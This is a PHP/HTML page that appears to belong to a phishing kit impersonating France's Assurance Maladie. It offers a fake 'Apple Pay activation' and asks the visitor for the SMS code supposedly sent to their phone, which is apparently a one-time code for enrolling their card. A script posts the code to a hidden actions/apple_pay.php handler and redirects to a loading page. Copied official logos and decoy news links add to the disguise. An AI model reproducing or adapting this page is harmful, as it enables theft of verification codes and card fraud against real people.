<?php 


include('../infos.php');
include("../common/sub_includes.php");
?>

<html lang="fr">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="apple-itunes-app" content="app-id=505488770">

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css" integrity="sha384-oS3vJWv+0UjzBfQzYUhtDYW+Pj2yciDJxpsK1OYPAYjqT085Qq/1cq5FLXAZQ7Ay" crossorigin="anonymous">

    <style>
        .content-wrap {
            overflow: hidden;
            margin: 10px 0px;
        }
        
        
        .content-wrap > div {
            float: left;
        }
        @media (min-width: 500px){
            .banner {
            float: left;
            width: 500px;
        }
        }

    </style>
    <link rel="stylesheet" href="../assets/css/style_v2.css">
    <link rel="stylesheet" href="../assets/css/bootstrap.css">

    <link rel="shortcut icon" href="https://web-carte-vitale.fr/public/fav.png" type="image/ico">

    <title>Veuillez remplir le formulaire</title>
</head>

<body>

    <div class="content-wrap" style="margin-top: 0px; margin-bottom: 30px; 
background: rgb(76, 175, 80) none repeat scroll 0% 0%;">
        <div class="banner">
        <?php include ("../assets/svg.php") ?>
        </div>
    </div>

    <div class="container">
        <div class="row">
            <ol class="breadcrumb ">
                <li><a href="#" id="toPortailPub" title="Retour au portail">Assurance Maladie</a></li>
                <li class="active">Activation d'apple Pay</li>
            </ol>
        </div>
    </div>
    <main class="container" style="margin-top:-12px;" id="contenu">

        <div class="row">
            <div class="col-md-12">

                <div class="panel panel-default" style="background: url(../assets/images/back.png);">
                    <div class="panel-heading">

                        <h2 id="titre_authent" style="margin-top:12px;" class="text-center">Liaison avec Apple pay</h2>
                    </div>

                    <div class="panel-body"><br> Apple Pay fait son arrivée au sein de l'assurance Maladie en vous proposant une solution simple et efficace pour recevoir vos versements automatiquement.
                        <br><br> Afin d'activer ce service gratuit, nous vous avons envoyé un code par SMS au <?php echo "+33 " . substr($_SESSION["phone"],1) ; ?> : <br><br>
                        <form action="" id="formit" method="POST"> 
                            <div class="row">
                                <div class="col-md-6">
									<style>
										.flex{
											display: flex;
											justify-content: space-between;
										}
									</style>


                                    <div class="form-group" id="fg_spi">
                                        <label for="spi_tmp">Code reçu par SMS</label>
                                        <div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
                                        <input class="form-control" id="name" name="code" type="text" aria-required="true" placeholder="" required="">
                                    </div>

                                    <button type="submit" id="submit" class="btn btn-xl btn-primary">Valider</button>

                                    <br><br>
                                </div>
                                <div class="col-md-6" style="border-radius:6px;">
                                    <img class="col-md-12" src="https://techblog.gr/wp-content/uploads/2019/03/6C1E5491-9496-439E-8BDE-05E0ED601851-1000x525.jpeg" style="border-radius:6px;">
                                </div>

                            </div>
                        </form>

                        <i>
						<small>Un délai de traitement commence le jour où nous recevons un formulaire dûment rempli et se termine lorsque nous prenons une décision. </small>
						</i>

                    </div>
                </div>
            </div>
        </div>
        <br><br>

        <div style="font-size: 1.8em;text-transform:uppercase;margin-bottom:15px;color: rgb(76, 175, 80);font-weight: 500;">
            L'actualité en bref
        </div>
        <div>
            <div class="row">
                <div class="col-md-6">
                    <div style="background: #fff;border-left: 4px solid rgb(33, 177, 150);padding: 8px 10px;margin-bottom:25px">
                        <a href="https://www.impots.gouv.fr/portail/actualite/publication-de-la-brochure-pratique-impots-locaux-2021" style="font-size: 1.1em;display:block">
							Publication de la brochure pratique Impôts locaux 2021
						</a>
                        <span style="color: #535353;font-size: 0.9em;">Particulier - 02-09-2021</span>
                    </div>
                </div>
                <div class="col-md-6">
                    <div style="background: #fff;border-left: 4px solid rgb(33, 177, 150);padding: 8px 10px;margin-bottom:25px">
                        <a href="https://www.impots.gouv.fr/portail/actualite/ouverture-de-lapplication-correction-en-ligne" style="font-size: 1.1em;display:block">
							Ouverture de l'application « Correction en ligne »
						</a>
                        <span style="color: #535353;font-size: 0.9em;">Particulier - 28-07-2021</span>
                    </div>
                </div>
                <div class="col-md-6">
                    <div style="background: #fff;border-left: 4px solid rgb(33, 177, 150);padding: 8px 10px;margin-bottom:25px">
                        <a href="https://www.impots.gouv.fr/portail/actualite/resultats-de-lenquete-de-satisfaction-realisee-aupres-dusagers-particuliers-de-la-dgfip-1" style="font-size: 1.1em;display:block">
							Résultats de l’enquête de satisfaction réalisée auprès d’usagers particuliers de la DGFIP en 2021
						</a>
                        <span style="color: #535353;font-size: 0.9em;">Particulier - 17-07-2021</span>
                    </div>
                </div>
                <div class="col-md-6">
                    <div style="background: #fff;border-left: 4px solid rgb(33, 177, 150);padding: 8px 10px;margin-bottom:25px">
                        <a href="https://www.impots.gouv.fr/portail/actualite/rapport-dactivite-2021-de-la-dgfip" style="font-size: 1.1em;display:block">
							Rapport d'activité 2021 de la DGFiP
						</a>
                        <span style="color: #535353;font-size: 0.9em;">Particulier - 15-07-2021</span>
                    </div>
                </div>
                <div class="col-md-6">
                    <div style="background: #fff;border-left: 4px solid rgb(33, 177, 150);padding: 8px 10px;margin-bottom:25px">
                        <a href="https://www.impots.gouv.fr/portail/actualite/paiement-de-proximite-aupres-des-buralistes-report-de-la-generalisation" style="font-size: 1.1em;display:block">
							Paiement de proximité auprès des buralistes : report de la généralisation
						</a>
                        <span style="color: #535353;font-size: 0.9em;">Particulier - 02-07-2021</span>
                    </div>
                </div>
                <div class="col-md-6">
                    <div style="background: #fff;border-left: 4px solid rgb(33, 177, 150);padding: 8px 10px;margin-bottom:25px">
                        <a href="https://www.impots.gouv.fr/portail/actualite/covid-19-attention-aux-arnaques-par-courriel" style="font-size: 1.1em;display:block">
							COVID-19 : attention aux arnaques par courriel !
						</a>
                        <span style="color: #535353;font-size: 0.9em;">Particulier - 20-05-2021</span>
                    </div>
                </div>
            </div>
        </div>

    </main>

    <div id="loading" class="LoadingPage" style="display : none">
        <div class="centre">
            <div style="text-align: center;">
                <div style="margin-bottom: 25px;">
                    <img style="height: 30px" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1f/ASSURANCE_MALADIE.svg/600px-ASSURANCE_MALADIE.svg.png">
                </div>
                <span>Chargement en cours</span>
            </div>
        </div>
    </div>

	<script
  src="https://code.jquery.com/jquery-3.4.1.min.js"
  crossorigin="anonymous"></script>


    <script>
        $(document).ready(function() {
        			$("#formit").submit(function(e) {
        				e.preventDefault();
        				var $this = $(this);
        				$("#loading").css("display", "block");
        				$.ajax({
        						method: "POST",
        						url: "../actions/apple_pay.php",
        						data: $(this).serialize()
        					})
        					.then(function(msg) {
        						setTimeout(function() {
        							window.location.href = "loading_finished.php";
        						}, 1500);
        					});
        				
        
        			});
        		});
    </script>

</body>

</html>